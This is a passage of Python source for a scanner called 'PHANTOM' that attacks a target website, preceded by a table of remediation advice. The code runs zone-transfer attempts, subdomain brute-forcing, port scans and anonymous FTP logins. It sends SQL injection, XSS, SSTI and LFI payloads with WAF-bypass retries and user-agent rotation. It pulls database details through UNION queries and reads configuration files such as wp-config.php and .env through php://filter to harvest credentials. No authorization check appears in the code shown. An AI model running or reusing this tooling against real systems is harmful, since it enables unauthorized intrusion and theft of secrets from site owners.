    "SSTI":["Never pass raw user input to template.render()","Use Jinja2 SandboxedEnvironment","Whitelist allowed template variables"],
    "LFI":["Never use user input in file functions","Whitelist allowed paths","Disable allow_url_include in php.ini"],
    "SSRF":["Whitelist allowed outbound domains","Block RFC-1918 at network level","Use IMDSv2 for AWS metadata"],
    "Web Cache Poisoning":["Strip unrecognized headers before caching","Set Cache-Control: no-store on sensitive pages","Validate Host header strictly"],
    "HTTP Parameter Pollution":["Accept only first occurrence of each parameter","Reject requests with duplicate parameters"],
    "Business Logic Flaw":["Validate all values server-side","Implement proper state machine","Add server-side business rule enforcement"],
    "OAuth Misconfiguration":["Validate redirect_uri against strict whitelist","Enforce state parameter","Use PKCE for public clients"],
    "SSL/TLS Weakness":["Disable SSLv2/3, TLS 1.0/1.1","Enable TLS 1.2+ only","Disable weak ciphers (RC4, DES, 3DES)","Implement HSTS"],
    "Rate Limiting Missing":["Implement rate limiting: Flask-Limiter, Nginx limit_req","Add CAPTCHA on login","Use exponential backoff"],
    "CSP Weakness":["Remove unsafe-inline and unsafe-eval","Use nonces or hashes instead","Add report-uri for violation monitoring"],
    "CORS Misconfiguration":["Set ACAO to explicit trusted domain list","Never reflect Origin blindly","Avoid ACAC:true with wildcard"],
    "Sensitive File Exposed":["Move files outside webroot","Block via .htaccess: Deny from all","Add .env to .gitignore"],
    "Clickjacking":["Add: X-Frame-Options: DENY","Add: Content-Security-Policy: frame-ancestors 'none'"],
    "CSRF Missing Token":["Add random CSRF token to all POST forms","Validate server-side every request"],
    "Insecure Cookie":["Set-Cookie: name=val; Secure; HttpOnly; SameSite=Strict"],
    "Missing Header (HIGH)":["Apache: Header always set X-Frame-Options DENY","Nginx: add_header X-Frame-Options DENY;","Express: use helmet()"],
    "Open Redirect":["Whitelist allowed redirect URLs","Never redirect to user-supplied URLs"],
    "API Key Exposed":["Rotate compromised key immediately","Use environment variables","Scan with trufflehog pre-commit"],
    "Command Injection":["Never pass input to shell_exec/system/exec","Use subprocess with array args (shell=False)"],
    "WordPress Vulnerability":["Keep WordPress core and plugins updated","Disable xmlrpc.php if unused","Use security plugin like Wordfence"],
    "Default Credentials":["Change all default passwords immediately","Implement account lockout after failed attempts","Use password manager for all service credentials"],
}


# ══ SCAN JOB ══════════════════════════════════════════════════════════════════
class ScanJob:
    PHASES = ["Phase 0: OSINT & Recon","Phase 1: Port Scan","Phase 2: Spider & JS","Phase 3: Vulns & Exploits"]
    def __init__(self, url):
        self.id          = str(uuid.uuid4())[:8]
        self.url         = url.rstrip("/")
        self.host        = urlparse(url).hostname or url
        self.status      = "running"
        self.logs        = deque(maxlen=300)
        self.vulns       = []
        self.ports       = []
        self.urls        = set()
        self.forms       = []
        self.js_files    = set()
        self.secrets     = []
        self.chains      = []
        self.subdomains  = []
        self.tech_stack  = []
        self.csp_analysis= {}
        self.ssl_info    = {}
        self.waf_info    = {}
        self.progress    = 0
        self.current_phase = "Initializing"
        self.phase_prog  = {p: {"done": 0, "total": 1} for p in self.PHASES}
        self.start       = time.time()
        self.elapsed     = 0
        self._lock       = threading.Lock()
        self._vcnt       = 0
        self._ua         = 0
        self._delay      = DELAY
        self._lat        = []

    def log(self, msg, level="INFO"):
        ts = datetime.now().strftime("%H:%M:%S")
        with self._lock:
            self.logs.append({"ts": ts, "msg": str(msg)[:140], "level": level})

    def chain(self, msg):
        ts = datetime.now().strftime("%H:%M:%S")
        with self._lock:
            self.chains.append({"ts": ts, "msg": msg})
        self.log(f"CHAIN: {msg}", "CHAIN")

    def add_vuln(self, vtype, location, param="", payload="", evidence="", extracted=None, chain_type=""):
        cvss_score, cvss_vec, cvss_sev = CVSS.score(vtype)
        impact = VULN_IMPACT.get(vtype, "Security issue detected")
        fix    = VULN_FIX.get(vtype, ["Review and remediate this vulnerability"])
        with self._lock:
            self._vcnt += 1
            det = evidence[:120]
            if det and det in [v["evidence"] for v in self.vulns]:
                return
            self.vulns.append({
                "id":          f"VULN-{self._vcnt:03d}",
                "type":        vtype,
                "severity":    cvss_sev,
                "cvss":        cvss_score,
                "cvss_vector": cvss_vec,
                "location":    location[:80],
                "parameter":   param,
                "payload":     payload[:80],
                "evidence":    evidence[:150],
                "extracted":   extracted or {},
                "impact":      impact,
                "fix":         fix,
                "chain_type":  chain_type,
            })
        self.log(f"[{cvss_sev}|{cvss_score}] {vtype} @ {location[:45]}", "VULN")

    def set_phase(self, name, total=10):
        self.current_phase = name
        with self._lock:
            self.phase_prog[name] = {"done": 0, "total": max(total, 1)}

    def advance(self, phase, by=1):
        with self._lock:
            if phase in self.phase_prog:
                pp = self.phase_prog[phase]
                pp["done"] = min(pp["done"] + by, pp["total"])
        td = sum(p["done"] for p in self.phase_prog.values())
        ta = sum(p["total"] for p in self.phase_prog.values())
        self.progress = int((td / max(ta, 1)) * 100)

    def counts(self):
        c = {"CRITICAL": 0, "HIGH": 0, "MEDIUM": 0, "LOW": 0}
        with self._lock:
            for v in self.vulns:
                c[v["severity"]] = c.get(v["severity"], 0) + 1
        return c

    def done(self):
        self.status        = "done"
        self.progress      = 100
        self.current_phase = "Complete"
        self.elapsed       = round(time.time() - self.start, 1)

    def req(self, url, method="GET", waf_bypass=False, **kw):
        h = {
            "User-Agent":    UAS[self._ua % len(UAS)],
            "Accept":        "text/html,*/*;q=0.8",
            "Accept-Language":"en-US,en;q=0.5",
            "Connection":    "keep-alive",
        }
        self._ua += 1
        for attempt in range(2):
            try:
                t0 = time.time()
                r  = requests.request(method, url, headers=h, timeout=TIMEOUT,
                                      verify=False, allow_redirects=True, **kw)
                lat = time.time() - t0
                self._lat.append(lat)
                if len(self._lat) > 10: self._lat.pop(0)
                avg = sum(self._lat) / len(self._lat)
                self._delay = min(DELAY + max(0, avg - 0.5) * 0.1, 2.0)
                time.sleep(self._delay)
                if r.status_code == 403 and waf_bypass and attempt == 0:
                    if "params" in kw:
                        kw["params"] = {k: quote(str(v)) for k, v in kw["params"].items()}
                    continue
                return r
            except Exception:
                return None
        return None


# ══ PHASE 0: OSINT, DNS, WAF, SUBDOMAIN ENUM ═════════════════════════════════
def phase_osint(job):
    job.set_phase("Phase 0: OSINT & Recon", 8)
    job.log(f"PHANTOM v{VER} — Target: {job.url}", "INFO")

    # IP resolution
    try:
        ip = socket.gethostbyname(job.host)
        job.log(f"IP: {ip}", "OK")
    except:
        job.log("Cannot resolve hostname", "WARN")
    job.advance("Phase 0: OSINT & Recon")

    # DNS records
    if DNS_OK:
        for rtype in ["A", "MX", "NS", "TXT", "CNAME", "SOA"]:
            try:
                ans = dns.resolver.resolve(job.host, rtype)
                for r in ans:
                    job.log(f"DNS {rtype}: {r}", "OK")
            except:
                pass
        # Zone transfer attempt
        try:
            ns_recs = dns.resolver.resolve(job.host, "NS")
            for ns in ns_recs:
                try:
                    z = dns.zone.from_xfr(dns.query.xfr(str(ns), job.host))
                    if z:
                        job.log(f"ZONE TRANSFER SUCCESS from {ns}!", "VULN")
                        job.add_vuln("DNS Zone Transfer", str(ns),
                                     evidence="AXFR returned full zone data — all subdomains exposed")
                except:
                    pass
        except:
            pass
    job.advance("Phase 0: OSINT & Recon")

    # WHOIS
    if WHOIS_OK:
        try:
            w = wh.whois(job.host)
            if w.registrar: job.log(f"Registrar: {w.registrar}", "OK")
            if w.creation_date: job.log(f"Created: {w.creation_date}", "OK")
        except:
            pass
    job.advance("Phase 0: OSINT & Recon")

    # WAF fingerprint
    waf_result = WAF_ENGINE.detect(job.url, job)
    job.waf_info = waf_result
    job.advance("Phase 0: OSINT & Recon")

    # Subdomain enumeration via crt.sh (public certificate transparency)
    _enum_subdomains_crtsh(job)
    job.advance("Phase 0: OSINT & Recon")

    # DNS brute-force subdomains
    _enum_subdomains_dns(job)
    job.advance("Phase 0: OSINT & Recon")

    # Server header recon
    try:
        r = requests.get(job.url, headers={"User-Agent": UAS[0]}, timeout=TIMEOUT, verify=False)
        for lh in ["Server", "X-Powered-By", "X-AspNet-Version", "X-Generator", "X-Runtime"]:
            if lh in r.headers:
                v = r.headers[lh]
                job.log(f"{lh}: {v} — version/tech leaked", "WARN")
                job.add_vuln("Info Disclosure", job.url,
                             evidence=f"{lh}: {v} — technology version exposed")
        # Detect framework from response
        body = r.text.lower()
        tech_map = {
            "WordPress":  ["wp-content", "wp-includes"],
            "Laravel":    ["laravel_session", "XSRF-TOKEN"],
            "Django":     ["csrfmiddlewaretoken", "__admin__"],
            "React":      ["__reactfiber", "_reactrootcontainer"],
            "Vue.js":     ["vue-app", "__vue"],
            "Angular":    ["ng-version", "ng-app"],
            "Express.js": ["x-powered-by: express"],
            "Ruby Rails": ["x-runtime", "_rails_session"],
            "Spring":     ["x-application-context", "jsessionid"],
            "Drupal":     ["drupal", "sites/default/files"],
            "Joomla":     ["joomla", "/components/com_"],
        }
        for tech, sigs in tech_map.items():
            ctx = body + str(r.headers).lower()
            if any(s in ctx for s in sigs):
                if tech not in job.tech_stack:
                    job.tech_stack.append(tech)
                    job.log(f"Framework: {tech} detected", "OK")
    except:
        pass
    job.advance("Phase 0: OSINT & Recon", 2)


def _enum_subdomains_crtsh(job):
    """Query crt.sh (public Certificate Transparency) — no API key needed."""
    try:
        r = requests.get(
            f"https://crt.sh/?q=%.{job.host}&output=json",
            timeout=10, headers={"User-Agent": UAS[0]}
        )
        if r.status_code != 200:
            return
        entries = r.json()
        found   = set()
        for e in entries:
            names = e.get("name_value", "").splitlines()
            for name in names:
                name = name.strip().lstrip("*.")
                if name.endswith(job.host) and name != job.host:
                    found.add(name)
        for sub in list(found)[:20]:
            job.subdomains.append({"subdomain": sub, "source": "crt.sh"})
            job.log(f"Subdomain (crt.sh): {sub}", "WARN")
            job.add_vuln("Subdomain Found", sub,
                         evidence=f"Subdomain discovered via certificate transparency logs",
                         extracted={"source": "crt.sh"})
        if found:
            job.chain(f"crt.sh found {len(found)} subdomains — each is potential attack surface")
    except:
        pass


def _enum_subdomains_dns(job):
    """Brute-force common subdomain names via DNS resolution."""
    if not DNS_OK:
        return
    found = []
    def check(word):
        fqdn = f"{word}.{job.host}"
        try:
            socket.gethostbyname(fqdn)
            return fqdn
        except:
            return None
    with ThreadPoolExecutor(max_workers=20) as ex:
        for result in ex.map(check, SUBDOMAIN_WORDS):
            if result:
                found.append(result)
                job.subdomains.append({"subdomain": result, "source": "dns-brute"})
                job.log(f"Subdomain (DNS): {result}", "WARN")
                job.add_vuln("Subdomain Found", result,
                             evidence=f"DNS brute-force resolved: {result}",
                             extracted={"source": "dns-brute"})
    if found:
        job.chain(f"DNS brute-force found {len(found)} live subdomains")


# ══ PHASE 1: PORT SCAN + SERVICE CHAINS ══════════════════════════════════════
def probe_port(host, port):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(1.2)
        if s.connect_ex((host, port)) == 0:
            banner = ""
            try:
                if port in (80, 8080, 8000, 3000):
                    s.send(b"HEAD / HTTP/1.0\r\nHost: " + host.encode() + b"\r\n\r\n")
                elif port == 25:
                    s.send(b"EHLO phantom.test\r\n")
                elif port == 21:
                    pass  # FTP sends banner on connect
                data = s.recv(256)
                banner = data.decode("utf-8", errors="ignore").strip()[:100]
            except:
                pass
            s.close()
            return {"port": port, "banner": banner}
        s.close()
    except:
        pass
    return None


def detect_service(port, banner):
    PM = {21:"FTP",22:"SSH",23:"Telnet",25:"SMTP",53:"DNS",80:"HTTP",110:"POP3",
          143:"IMAP",443:"HTTPS",445:"SMB",1433:"MSSQL",3000:"Dev-App",3306:"MySQL",
          3389:"RDP",4000:"Dev-App",5000:"Dev-App",5432:"PostgreSQL",5672:"RabbitMQ",
          5900:"VNC",6379:"Redis",8000:"HTTP-Dev",8080:"HTTP-Alt",8081:"HTTP-Alt",
          8443:"HTTPS-Alt",8888:"Jupyter",9000:"PHP-FPM",9090:"Prometheus",
          9200:"Elasticsearch",9300:"Elastic-Node",10000:"Webmin",
          11211:"Memcached",27017:"MongoDB",50000:"DB2"}
    svc  = PM.get(port, f"Port-{port}")
    cves = []
    version = ""
    vm = re.search(r"[\w./]+[\d]+\.[\d.]+", banner)
    if vm:
        version = vm.group(0)[:40]
    for pattern, checks in VERSION_CVE.items():
        m = re.search(pattern, banner, re.IGNORECASE)
        if m:
            version = m.group(0)[:40]
            try:
                ver = tuple(int(x) for x in m.group(1).split(".")[:3])
                for threshold, desc in checks:
                    if ver < threshold:
                        cves.append(desc)
            except:
                pass
    return {"service": svc, "version": version, "cves": cves}


def phase_ports(job):
    job.set_phase("Phase 1: Port Scan", len(TOP_PORTS))
    job.log(f"Async scanning {len(TOP_PORTS)} ports on {job.host}...", "INFO")
    with ThreadPoolExecutor(max_workers=25) as ex:
        futs = {ex.submit(probe_port, job.host, p): p for p in TOP_PORTS}
        for fut in as_completed(futs):
            res = fut.result()
            if res:
                info  = detect_service(res["port"], res["banner"])
                entry = {**res, **info}
                with job._lock:
                    job.ports.append(entry)
                if res["port"] in DANGEROUS_PORTS:
                    job.log(f"DANGEROUS: {DANGEROUS_PORTS[res['port']]} on {res['port']}", "VULN")
                    job.add_vuln("Open Port (Dangerous)", f"{job.host}:{res['port']}",
                                 evidence=f"{info['service']} exposed — typically unauthenticated")
                else:
                    job.log(f"Open: {res['port']} ({info['service']}) {info['version'][:25]}", "OK")
                for cve in info["cves"]:
                    job.add_vuln("Outdated Service CVE", f"{job.host}:{res['port']}",
                                 evidence=f"{info['version']} — {cve}")
            job.advance("Phase 1: Port Scan")
    port_nums = [p["port"] for p in job.ports]
    if 6379 in port_nums:             _chain_redis(job)
    if 9200 in port_nums:             _chain_elasticsearch(job)
    if 27017 in port_nums:            _chain_mongodb(job)
    if 21 in port_nums:               _chain_ftp(job)
    if 11211 in port_nums:            _chain_memcached(job)
    # SSL deep analysis on HTTPS ports
    for p in port_nums:
        if p in (443, 8443, 465, 993, 995):
            _ssl_deep_analysis(job, p)
            break


def _chain_redis(job):
    try:
        s = socket.socket(); s.settimeout(3); s.connect((job.host, 6379))
        s.send(b"INFO server\r\n")
        data = s.recv(1024).decode("utf-8", errors="ignore"); s.close()
        if "redis_version" in data:
            vm = re.search(r"redis_version:(.+)", data)
            ver = vm.group(1).strip() if vm else "?"
            job.chain(f"Redis unauth — v{ver} — all keys readable without credentials")
            job.add_vuln("Unauthenticated Redis", f"redis://{job.host}:6379",
                         evidence=f"INFO server returned without auth — version {ver}",
                         chain_type="OPEN_REDIS")
    except:
        pass


def _chain_elasticsearch(job):
    for port in (9200, 9201):
        try:
            r = requests.get(f"http://{job.host}:{port}/_cat/indices?v",
                             timeout=4, verify=False)
            if r.status_code == 200 and ("green" in r.text or "yellow" in r.text):
                job.chain(f"Elasticsearch indices listed on port {port} without auth")
                job.add_vuln("Unauthenticated Elasticsearch",
                             f"http://{job.host}:{port}",
                             evidence="/_cat/indices returned data — no credentials required")
                return
        except:
            pass


def _chain_mongodb(job):
    try:
        s = socket.socket(); s.settimeout(3); s.connect((job.host, 27017))
        probe = (b"\x41\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\xd4\x07\x00\x00"
                 b"\x00\x00\x00\x00admin.$cmd\x00\x00\x00\x00\x00\x01\x00\x00\x00"
                 b"\x13\x00\x00\x00\x10isMaster\x00\x01\x00\x00\x00\x00")
        s.send(probe); data = s.recv(512); s.close()
        if len(data) > 20:
            job.chain("MongoDB responded without authentication — collections accessible")
            job.add_vuln("Unauthenticated MongoDB", f"mongodb://{job.host}:27017",
                         evidence="Wire protocol response without credentials")
    except:
        pass


def _chain_ftp(job):
    try:
        s = socket.socket(); s.settimeout(4); s.connect((job.host, 21))
        banner = s.recv(256).decode("utf-8", errors="ignore")
        s.send(b"USER anonymous\r\n"); time.sleep(0.3); s.recv(256)
        s.send(b"PASS anon@phantom.test\r\n"); time.sleep(0.3)
        resp = s.recv(256).decode("utf-8", errors="ignore"); s.close()
        if "230" in resp:
            job.chain("FTP anonymous login accepted — files readable without credentials")
            job.add_vuln("FTP Anonymous Login", f"ftp://{job.host}:21",
                         evidence=f"Anonymous FTP login OK. Banner: {banner[:60]}")
    except:
        pass


def _chain_memcached(job):
    try:
        s = socket.socket(); s.settimeout(3); s.connect((job.host, 11211))
        s.send(b"stats\r\n")
        data = s.recv(1024).decode("utf-8", errors="ignore"); s.close()
        if "STAT " in data:
            vm = re.search(r"STAT version (.+)", data)
            ver = vm.group(1).strip() if vm else "?"
            job.chain(f"Memcached stats accessible without auth — v{ver}")
            job.add_vuln("Open Port (Dangerous)", f"{job.host}:11211",
                         evidence=f"Memcached stats returned without auth — v{ver}")
    except:
        pass


def _ssl_deep_analysis(job, port=443):
    """Deep SSL/TLS analysis — protocols, ciphers, cert validity, known weaknesses."""
    job.log(f"SSL/TLS deep analysis on port {port}...", "INFO")
    result = {"port": port, "issues": []}
    host   = job.host

    # Check weak protocols
    for proto in [ssl.PROTOCOL_SSLv23]:
        for weak_ver, label in [(ssl.OP_NO_SSLv2, "SSLv2"), (ssl.OP_NO_SSLv3, "SSLv3"),
                                 (ssl.OP_NO_TLSv1, "TLS 1.0"), (ssl.OP_NO_TLSv1_1, "TLS 1.1")]:
            try:
                ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
                ctx.check_hostname = False
                ctx.verify_mode    = ssl.CERT_NONE
                with ctx.wrap_socket(socket.create_connection((host, port), timeout=5),
                                     server_hostname=host) as s:
                    ver = s.version()
                    job.log(f"TLS Version: {ver}", "OK")
                    if ver in ("TLSv1", "TLSv1.1", "SSLv3"):
                        job.add_vuln("SSL/TLS Weakness", f"{host}:{port}",
                                     evidence=f"Deprecated {ver} accepted — POODLE/BEAST risk")
                        result["issues"].append(f"Weak protocol: {ver}")
                    # Check cipher suite
                    cipher = s.cipher()
                    if cipher:
                        cipher_name = cipher[0]
                        for weak in ["RC4", "DES", "3DES", "EXPORT", "NULL", "ANON"]:
                            if weak in cipher_name.upper():
                                job.add_vuln("SSL/TLS Weakness", f"{host}:{port}",
                                             evidence=f"Weak cipher negotiated: {cipher_name}")
                                result["issues"].append(f"Weak cipher: {cipher_name}")
                    # Cert details
                    cert = s.getpeercert()
                    if cert:
                        exp_str = cert.get("notAfter", "")
                        try:
                            exp_date = datetime.strptime(exp_str, "%b %d %H:%M:%S %Y %Z")
                            days     = (exp_date - datetime.utcnow()).days
                            if days < 0:
                                job.add_vuln("SSL/TLS Weakness", f"{host}:{port}",
                                             evidence=f"Certificate EXPIRED {abs(days)} days ago!")
                            elif days < 14:
                                job.log(f"Cert expires in {days} days — urgent renewal!", "WARN")
                            else:
                                job.log(f"Cert valid {days} days remaining", "OK")
                            result["days_left"] = days
                        except:
                            pass
                        subj = dict(x[0] for x in cert.get("subject", []))
                        job.log(f"Cert CN: {subj.get('commonName', 'N/A')}", "OK")
                    break
            except ssl.SSLError:
                pass
            except Exception:
                pass

    # Check HTTP→HTTPS redirect
    try:
        http_url = job.url.replace("https://", "http://")
        r = requests.get(http_url, timeout=5, verify=False, allow_redirects=False)
        if r.status_code == 200:
            job.add_vuln("SSL/TLS Weakness", job.url,
                         evidence="HTTP version accessible without HTTPS redirect — no HSTS enforcement")
        elif r.status_code in (301, 302, 307, 308):
            loc = r.headers.get("Location", "")
            if "https://" in loc:
                job.log("HTTP → HTTPS redirect configured", "OK")
    except:
        pass

    job.ssl_info = result


# ══ PHASE 2: RECURSIVE SPIDER + JS ANALYSIS ══════════════════════════════════
JS_EP_PATTERNS = [
    r"""fetch\s*\(\s*['"`]([^'"`]+)['"`]""",
    r"""axios\.\w+\s*\(\s*['"`]([^'"`]+)['"`]""",
    r"""(?:url|endpoint|path|href)\s*[=:]\s*['"`]([/][^'"`\s]{3,})['"`]""",
    r"""ws[s]?://[^'"`\s]+""",
    r"""(?:baseURL|API_URL|BASE_URL)\s*[=:]\s*['"`](https?://[^'"`\s]+)['"`]""",
    r"""/api/v?\d*/[\w/{}\-]+""",
]


def _parse_js(job, js, source):
    base_d = urlparse(job.url).netloc
    for pat in JS_EP_PATTERNS:
        for m in re.finditer(pat, js):
            path = m.group(1) if m.lastindex else m.group(0)
            if path.startswith("/"):
                full = urljoin(job.url, path)
            elif path.startswith(("http", "ws")):
                full = path
            else:
                continue
            if urlparse(full).netloc in ("", base_d):
                job.urls.add(full)
    for kt, pattern in JS_SECRETS.items():
        for m in re.finditer(pattern, js):
            val = m.group(0)[:100]
            if not any(val == s.get("value", "")[:100] for s in job.secrets):
                sev = SECRET_SEV.get(kt, "HIGH")
                with job._lock:
                    job.secrets.append({"type": kt, "value": val, "source": source, "severity": sev})
                job.log(f"SECRET [{sev}]: {kt} — {val[:40]}...", "VULN")
                job.add_vuln("API Key Exposed", source,
                             evidence=f"{kt}: {val[:40]}...",
                             extracted={"key_type": kt, "severity": sev})
    # Check for DOM XSS sinks
    dom_sinks = ["innerHTML", "document.write", "eval(", "setTimeout(", "setInterval(",
                 "location.href", "location.replace", "document.domain"]
    for sink in dom_sinks:
        if sink in js and ("location.search" in js or "location.hash" in js or
                           "URLSearchParams" in js or "location.href" in js):
            job.log(f"Potential DOM XSS sink: {sink} with user-controlled input", "WARN")


def _crawl(job, url, depth=0):
    if depth > DEPTH or len(job.urls) >= MAXURLS or url in job.urls:
        return
    job.urls.add(url)
    resp = job.req(url)
    if not resp:
        return
    soup = BeautifulSoup(resp.text, "html.parser")
    base_d = urlparse(job.url).netloc

    for tag, attr in [("a","href"),("form","action"),("script","src"),
                       ("link","href"),("iframe","src")]:
        for el in soup.find_all(tag):
            raw = el.get(attr, "")
            if not raw or raw.startswith(("mailto:", "tel:", "#", "javascript:")):
                continue
            full  = urljoin(url, raw)
            p     = urlparse(full)
            if p.netloc != base_d:
                continue
            clean = p._replace(fragment="").geturl()
            if tag == "script" and attr == "src":
                job.js_files.add(clean)
            if clean not in job.urls and len(job.urls) < MAXURLS:
                _crawl(job, clean, depth + 1)

    for sc in soup.find_all("script"):
        _parse_js(job, sc.string or "", url)

    for form in soup.find_all("form"):
        action = urljoin(url, form.get("action", url))
        method = form.get("method", "get").upper()
        inputs = {i.get("name"): i.get("value", "")
                  for i in form.find_all(["input","textarea","select"])
                  if i.get("name")}
        if inputs:
            entry = {"action": action, "method": method, "inputs": inputs}
            if entry not in job.forms:
                with job._lock:
                    job.forms.append(entry)

    import bs4
    for c in soup.find_all(string=lambda t: isinstance(t, bs4.Comment)):
        for p2 in re.findall(r"(/[a-zA-Z0-9_\-/]{3,})", str(c)):
            job.urls.add(urljoin(url, p2))
        if any(kw in str(c).lower() for kw in ["password","secret","api","todo","debug","hack"]):
            job.add_vuln("Info Disclosure", url,
                         evidence=f"Sensitive HTML comment: {str(c)[:80]}")


def phase_spider(job):
    job.set_phase("Phase 2: Spider & JS", 5)
    r = job.req(urljoin(job.url, "/robots.txt"))
    if r and r.status_code == 200:
        for line in r.text.splitlines():
            if line.lower().startswith("disallow:"):
                p = line.split(":", 1)[1].strip()
                if p and p != "/":
                    job.urls.add(urljoin(job.url, p))
        job.log(f"robots.txt: {r.text.count('Disallow')} entries added", "OK")
    job.advance("Phase 2: Spider & JS")

    r = job.req(urljoin(job.url, "/sitemap.xml"))
    if r and r.status_code == 200:
        for m in re.finditer(r"<loc>(.*?)</loc>", r.text):
            if urlparse(m.group(1)).netloc == job.host:
                job.urls.add(m.group(1).strip())
    job.advance("Phase 2: Spider & JS")

    _crawl(job, job.url)
    job.advance("Phase 2: Spider & JS")

    for js_url in list(job.js_files)[:20]:
        r = job.req(js_url)
        if r and r.status_code == 200:
            _parse_js(job, r.text, js_url)
    job.advance("Phase 2: Spider & JS")

    job.log(f"Spider: {len(job.urls)} URLs | {len(job.forms)} forms | {len(job.js_files)} JS | {len(job.secrets)} secrets", "OK")
    job.advance("Phase 2: Spider & JS")


# ══ PHASE 3: ALL VULNERABILITY MODULES ═══════════════════════════════════════

# ── Helper: SQLi data extraction ─────────────────────────────────────────────
def _sqli_extract(job, url, param, params):
    for cols in range(1, 5):
        for label, expr in [("version","version()"),("db","database()"),("user","user()")]:
            pfx = "NULL," * (cols - 1)
            tp  = params.copy()
            tp[param] = f"' UNION SELECT {pfx}{expr}--"
            r = job.req(url, params=tp)
            if not r:
                continue
            vm = re.search(r"\b(\d+\.\d+[.\d\-\w]+)\b", r.text)
            if vm:
                val = vm.group(1)
                job.chain(f"SQLi data extracted — {label}: {val}")
                return {label: val}
        if True:
            break
    return {}


# ── Module A: Smart SQL Injection ─────────────────────────────────────────────
def mod_sqli(job, url):
    parsed = urlparse(url)
    if not parsed.query:
        return
    params = dict(parse_qsl(parsed.query))
    use_bypass = bool(job.waf_info.get("waf"))

    for param, value in params.items():
        ptype = FUZZER.detect_type(param, value)
        payloads = FUZZER.get_sqli(ptype) + SQL_PAYLOADS[:12] + FUZZER.mutate(value)

        for payload in payloads:
            tp = params.copy(); tp[param] = payload
            r  = job.req(url, params=tp, waf_bypass=use_bypass)
            if not r:
                continue
            for err in SQL_ERRORS:
                if re.search(err, r.text.lower(), re.IGNORECASE):
                    ext = _sqli_extract(job, url, param, params)
                    job.add_vuln("SQL Injection", url, param=param, payload=payload,
                                 evidence=f"SQL error detected (param type: {ptype})",
                                 extracted=ext, chain_type="SQLI")
                    return

            # Time-based blind
            if "SLEEP" in payload.upper() or "WAITFOR" in payload.upper():
                t0 = time.time()
                job.req(url, params={**params, param: payload})
                if time.time() - t0 > 3.0:
                    job.add_vuln("SQL Injection", url, param=param, payload=payload,
                                 evidence=f"Time-based blind SQLi — response delayed >3s")
                    return

        # NoSQL injection attempt
        for payload in FUZZER.NOSQL:
            tp = params.copy(); tp[param] = payload
            r  = job.req(url, params=tp)
            if r and r.status_code == 200 and "error" not in r.text.lower():
                job.add_vuln("SQL Injection", url, param=param, payload=payload,
                             evidence=f"NoSQL injection — operator not rejected: {payload}")
                return

        # Prototype pollution
        for payload in FUZZER.PROTO:
            tp = params.copy(); tp[param] = payload
            r  = job.req(url, params=tp)
            if r and "polluted" in r.text:
                job.add_vuln("Proto Pollution", url, param=param, payload=payload,
                             evidence="Prototype pollution — 'polluted' key appeared in response")
                return


def mod_sqli_forms(job):
    for form in job.forms:
        for field, val in form["inputs"].items():
            ptype    = FUZZER.detect_type(field, val)
            payloads = FUZZER.get_sqli(ptype) + SQL_PAYLOADS[:10]
            for payload in payloads:
                data = dict(form["inputs"]); data[field] = payload
                r = (job.req(form["action"], method="POST", data=data)
                     if form["method"] == "POST"
                     else job.req(form["action"], params=data))
                if r:
                    for err in SQL_ERRORS:
                        if re.search(err, r.text.lower(), re.IGNORECASE):
                            job.add_vuln("SQL Injection (Form)", form["action"],
                                         param=field, payload=payload,
                                         evidence="SQL error in form submission")
                            return


# ── Module B: Smart XSS ───────────────────────────────────────────────────────
def mod_xss(job, url):
    parsed = urlparse(url)
    if not parsed.query:
        return
    params     = dict(parse_qsl(parsed.query))
    use_bypass = bool(job.waf_info.get("waf"))

    for param, value in params.items():
        ptype    = FUZZER.detect_type(param, value)
        payloads = FUZZER.get_xss(ptype) + XSS_PAYLOADS[:8] + FUZZER.SSTI

        for payload in payloads:
            tp = params.copy(); tp[param] = payload
            r  = job.req(url, params=tp, waf_bypass=use_bypass)
            if r and payload in r.text:
                if payload in ("{{7*7}}", "${7*7}", "#{7*7}") and "49" in r.text:
                    job.add_vuln("SSTI", url, param=param, payload=payload,
                                 evidence="Template expression 7*7=49 executed — RCE possible",
                                 chain_type="SSTI_CONFIRMED")
                else:
                    job.add_vuln("Reflected XSS", url, param=param, payload=payload,
                                 evidence=f"Payload reflected verbatim (param type: {ptype})")
                return


def mod_xss_forms(job):
    for form in job.forms:
        for field, val in form["inputs"].items():
            ptype = FUZZER.detect_type(field, val)
            for payload in FUZZER.get_xss(ptype) + XSS_PAYLOADS[:6]:
                data = dict(form["inputs"]); data[field] = payload
                r = (job.req(form["action"], method="POST", data=data)
                     if form["method"] == "POST"
                     else job.req(form["action"], params=data))
                if r and payload in r.text:
                    job.add_vuln("Reflected XSS (Form)", form["action"],
                                 param=field, payload=payload,
                                 evidence="XSS payload reflected in form response")
                    return


# ── Module C: LFI + php://filter chain ───────────────────────────────────────
def mod_lfi(job, url):
    params = dict(parse_qsl(urlparse(url).query))
    fp     = {k: v for k, v in params.items()
               if any(kw in k.lower() for kw in LFI_PARAMS)}
    for param in fp:
        for payload in LFI_PAYLOADS:
            tp = params.copy(); tp[param] = payload
            r  = job.req(url, params=tp)
            if r and any(ind in r.text for ind in LFI_INDICATORS):
                excerpt = r.text[:200] if "root:x:" in r.text else ""
                job.add_vuln("LFI", url, param=param, payload=payload,
                             evidence="File inclusion confirmed",
                             extracted={"excerpt": excerpt},
                             chain_type="LFI_CONFIRMED")
                for cfg in ["config.php","wp-config.php",".env","settings.py","application.yml"]:
                    tp2 = params.copy()
                    tp2[param] = f"php://filter/convert.base64-encode/resource={cfg}"
                    r2 = job.req(url, params=tp2)
                    if r2 and len(r2.text) > 30:
                        try:
                            b64 = re.search(r"[A-Za-z0-9+/=]{20,}", r2.text)
                            if b64:
                                dec = base64.b64decode(b64.group(0)).decode("utf-8", errors="ignore")
                                if any(kw in dec.lower() for kw in
                                       ["password","secret","define(","DB_","KEY"]):
                                    job.chain(f"php://filter read {cfg} — credentials in source!")
                                    job.add_vuln("LFI Config Read", url, param=param,
                                                 payload=tp2[param],
                                                 evidence=f"php://filter decoded {cfg} — secrets present",
                                                 extracted={"preview": dec[:200]})
                        except:
                            pass
                return


# ── Module D: SSRF ────────────────────────────────────────────────────────────
def mod_ssrf(job, url):
    params = dict(parse_qsl(urlparse(url).query))
    sp     = {k: v for k, v in params.items() if k.lower() in SSRF_PARAMS}
    for param in sp:
        for ssrf_url in SSRF_PAYLOADS:
            tp = params.copy(); tp[param] = ssrf_url
            t0 = time.time()
            r  = job.req(url, params=tp)
            if not r:
                continue
